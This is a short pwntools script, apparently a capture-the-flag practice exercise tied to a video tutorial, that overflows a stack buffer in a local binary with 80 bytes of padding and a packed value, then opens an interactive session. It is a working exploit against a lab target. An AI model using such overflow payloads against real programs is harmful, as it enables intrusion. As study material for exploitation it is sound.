'''
Author: Jack Jparrow
Date: 2022-08-20 17:24:04
LastEditTime: 2022-11-15 17:04:42
LastEditors: 白银
Description: https://www.bilibili.com/video/BV1mr4y1Y7fW?p=13&vd_source=12b05ccdf92b6ba12a9bd0495b00017a&t=776.0
'''

from pwn import *

context(log_level = 'debug', arch = 'arm64', os = 'linux')
# context(log_level = 'debug', arch = 'amd64', os = 'linux')#附加gdb用
pwnfile = './question_1_variety_x64'
io = process(pwnfile)

elf = ELF(pwnfile)
rop = ROP(pwnfile)

padding = 80 #rbp - 0x20 = 0x7fffffffdc00 - 0x20 = 0x7fffffffdbe0 → 0x7fffffffdbe0 - 0x7fffffffdb90(cyclic输入的100个字符的开始地址) = 0x50 → 转十进制
payloadtext = 0x61 #cmp    al, 0x61
payload = padding * b'a' + p64(payloadtext)

delimiter = b'input:\n'
# io.sendafter(dem, payload)
# 附加gdb用，配合上面的
io.sendlineafter(delimiter, payload)
io.interactive()#交互shell